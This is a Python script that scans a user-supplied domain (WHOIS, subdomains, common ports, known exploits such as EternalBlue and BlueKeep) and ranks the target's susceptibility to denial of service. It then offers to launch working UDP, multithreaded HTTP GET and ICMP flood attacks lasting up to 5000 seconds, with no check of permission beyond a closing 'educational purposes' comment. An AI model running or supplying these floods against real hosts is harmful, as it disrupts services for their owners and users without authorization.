import socket
import whois
import requests
import ssl
import subprocess
import sys
import time
import os
import threading
from termcolor import colored
from urllib.parse import urlparse

# ---------------------------- DISPLAY ----------------------------
def banner(domain, ip):
    print("\n" + "="*60)
    print(colored(f"🌐 DOMAIN RECON REPORT", "cyan", attrs=["bold"]))
    print("="*60)
    print(f"🧾 Target Domain: {colored(domain, 'yellow', attrs=['bold'])}")
    print(f"🔍 Resolved IP : {colored(ip, 'green', attrs=['bold'])}")
    print("="*60 + "\n")

# ---------------------------- RECON MODULES ----------------------------
def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except Exception as e:
        print(f"❌ Resolution failed: {e}")
        return None

def whois_lookup(domain):
    print(colored("\n📜 WHOIS Lookup", "cyan", attrs=["bold"]))
    print("-" * 50)
    try:
        w = whois.whois(domain)
        print(f"📅 Created: {w.creation_date}")
        print(f"📆 Expires: {w.expiration_date}")
        print(f"👤 Registrant: {w.name or 'N/A'}")
        print(f"📩 Email: {w.emails or 'N/A'}")
        print(f"🏢 Registrar: {w.registrar}")
    except Exception as e:
        print(f"❌ WHOIS failed: {e}")

def subdomain_scan(domain):
    print(colored("\n📡 Subdomain Scan", "cyan", attrs=["bold"]))
    print("-" * 50)
    wordlist = ["www", "mail", "ftp", "blog", "api", "dev"]
    for sub in wordlist:
        subdomain = f"{sub}.{domain}"
        try:
            socket.gethostbyname(subdomain)
            print(f"✅ Found: {subdomain}")
        except:
            pass

def port_scan(ip):
    print(colored("\n🛰️ Port Scan", "cyan", attrs=["bold"]))
    print("-" * 50)
    common_ports = [7, 19, 21, 22, 23, 25, 53, 80, 110, 123, 135, 139, 143, 161, 443, 445, 587, 993, 995, 3306, 3389, 8080, 1900]
    open_ports = []
    for port in common_ports:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            if sock.connect_ex((ip, port)) == 0:
                print(f"🔓 Port {port} is OPEN")
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

def vuln_check(ip, open_ports):
    print(colored("\n🛡️ Vulnerability Awareness", "red", attrs=["bold"]))
    print("-" * 50)
    known_vulns = {
        21: ("FTP", "Anonymous login, brute force"),
        22: ("SSH", "Weak keys/passwords"),
        23: ("Telnet", "Unencrypted, default creds"),
        80: ("HTTP", "XSS, SQLi, outdated CMS"),
        443: ("HTTPS", "SSL misconfigs"),
        445: ("SMB", "EternalBlue, SMBv1"),
        3306: ("MySQL", "Weak creds, SQLi"),
        3389: ("RDP", "BlueKeep, RDP brute-force"),
        8080: ("Alt HTTP", "Exposed admin/dev interfaces"),
    }
    for port in open_ports:
        if port in known_vulns:
            service, desc = known_vulns[port]
            print(f"⚠️ Port {port} ({service}) → {colored(desc, 'yellow')}")
        else:
            print(f"🔎 Port {port}: No known vulnerability found.")

def dos_readiness_check(ip, open_ports):
    print(colored("\n🧨 DoS Readiness Scan", "magenta", attrs=["bold"]))
    print("-" * 50)
    dos_ports = {7: "Echo", 19: "Chargen", 123: "NTP", 161: "SNMP", 1900: "SSDP", 53: "DNS", 80: "HTTP", 443: "HTTPS"}
    vulnerable = []
    for port in open_ports:
        if port in dos_ports:
            print(f"⚠️ Port {port} ({dos_ports[port]}) is DoS-prone.")
            vulnerable.append((port, dos_ports[port]))
    print("\n⏱️ Measuring response...")
    try:
        start = time.time()
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((ip, open_ports[0]))
        sock.send(b"HEAD / HTTP/1.1\r\nHost: test\r\n\r\n")
        sock.recv(1024)
        sock.close()
        delay = time.time() - start
        print(f"⏱️ Response time: {round(delay, 2)}s")
        if delay > 1.5:
            print("⚠️ May be DoS-susceptible.")
        else:
            print("✅ Fast response.")
    except:
        print("⚠️ Response check failed.")
    return vulnerable

def tech_headers(domain):
    print(colored("\n🧪 HTTP Headers", "cyan", attrs=["bold"]))
    print("-" * 50)
    try:
        r = requests.get(f"http://{domain}", timeout=3)
        for k, v in r.headers.items():
            print(f"🔧 {k}: {v}")
    except Exception as e:
        print(f"❌ Failed: {e}")

def ssl_info(domain):
    print(colored("\n🔐 SSL Certificate Info", "cyan", attrs=["bold"]))
    print("-" * 50)
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                print(f"📅 Issued On : {cert.get('notBefore')}")
                print(f"📆 Expires   : {cert.get('notAfter')}")
                print(f"🔐 Issuer    : {cert.get('issuer')}")
    except Exception as e:
        print(f"❌ SSL failed: {e}")

def reverse_ip(ip):
    print(colored("\n🧭 Reverse IP Lookup", "cyan", attrs=["bold"]))
    print("-" * 50)
    try:
        result = subprocess.check_output(f"curl -s https://api.hackertarget.com/reverseiplookup/?q={ip}", shell=True)
        print(result.decode())
    except Exception as e:
        print(f"❌ Reverse IP failed: {e}")

# ---------------------------- DoS Module ----------------------------
def recommend_attack(open_ports):
    if any(p in open_ports for p in [80, 443, 8080]):
        return "HTTP"
    elif any(p in open_ports for p in [7, 19, 123, 161, 1900]):
        return "UDP"
    return "ICMP"

def udp_flood(ip, port, duration):
    import random
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    end = time.time() + duration
    count = 0
    print(f"📤 UDP Flood for {duration}s on {ip}:{port}")
    while time.time() < end:
        sock.sendto(payload, (ip, port))
        count += 1
        print(f"📦 Sent #{count}", end="\r")
    print("\n✅ UDP complete.")

def http_flood(url, duration):
    session = requests.Session()
    end = time.time() + duration
    count = 0
    print(f"🌐 HTTP GET Flood on {url} for {duration}s")

    def attack():
        nonlocal count
        while time.time() < end:
            try:
                r = session.get(url, headers={"User-Agent": "DoS-Sentinel/1.0"})
                count += 1
                print(f"✅ HTTP {count} | Status: {r.status_code}", end="\r")
            except:
                pass

    threads = []
    for _ in range(10):  # 10 threads
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("\n✅ HTTP flood complete.")

def icmp_flood(ip, duration):
    print(f"🧬 ICMP Ping flood on {ip} for {duration}s")
    os.system(f"ping -i 0.2 -w {duration} {ip}")

# ---------------------------- Main Execution ----------------------------
def recon_main():
    domain = input("🔎 Enter domain to scan: ").strip()
    ip = resolve_domain(domain)
    if not ip: return
    banner(domain, ip)
    whois_lookup(domain)
    subdomain_scan(domain)
    open_ports = port_scan(ip)
    vuln_check(ip, open_ports)
    dos_prone = dos_readiness_check(ip, open_ports)
    tech_headers(domain)
    ssl_info(domain)
    reverse_ip(ip)

    print(colored("\n💡 Recommended DoS Type:", "magenta", attrs=["bold"]))
    best = recommend_attack(open_ports)
    print(f"🎯 {colored(best, 'yellow', attrs=['bold'])}")

    if input("🔥 Simulate DoS? (y/n): ").lower() == 'y':
        print("\n💥 Choose Attack:")
        print("1. ICMP\n2. UDP\n3. HTTP")
        choice = input(f"👉 Select [default = {best}]: ").strip()
        attack = {"1": "ICMP", "2": "UDP", "3": "HTTP"}.get(choice, best)
        try:
            duration = int(input("⏱️ Duration (max 5000s): "))
            if duration > 5000: duration = 5000
        except:
            duration = 30

        if attack == "ICMP":
            icmp_flood(ip, duration)
        elif attack == "UDP":
            port = int(input("📍 Target port [default 80]: ") or "80")
            udp_flood(ip, port, duration)
        elif attack == "HTTP":
            http_flood(f"http://{domain}", duration)

# ---------------------------- Run ----------------------------
if __name__ == "__main__":
    try:
        from termcolor import colored
    except:
        subprocess.call([sys.executable, "-m", "pip", "install", "termcolor"])
        from termcolor import colored
    recon_main()


# This script is for educational purposes only. Use responsibly.
# Always get permission before scanning any network or system.
# Made by TheRAMO